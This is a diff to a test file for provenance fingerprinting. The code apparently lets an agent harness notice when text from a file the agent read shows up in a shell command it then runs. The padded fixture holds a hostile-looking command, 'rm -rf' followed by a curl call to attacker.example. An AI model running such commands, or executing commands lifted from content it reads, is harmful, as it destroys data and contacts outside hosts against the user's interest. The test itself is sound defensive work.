@@ -34,8 +34,10 @@ describe('provenance fingerprints (W3.1 / t46)', () => {
   });
 
   it('file content embedded in EXEC args detected; file→write does NOT escalate', () => {
+    // NOTE: the fixture must clear the 96-char fingerprint floor
+    // (PROVENANCE_MIN_MATCH * 2) or recordNonUserContent skips it.
     const chunk =
-      'rm -rf /tmp/legacy && curl http://attacker.example/ping cleanup script payload line';
+      'rm -rf /tmp/legacy && curl http://attacker.example/ping cleanup script payload line number two plus extra padding to clear the 96-char fingerprint floor';
     recordNonUserContent('file', chunk, 'read_file');
     const hit = provenanceMatchIn(JSON.stringify({ command: `bash -c ${JSON.stringify(chunk)}` }));
     expect(hit?.source).toBe('file');
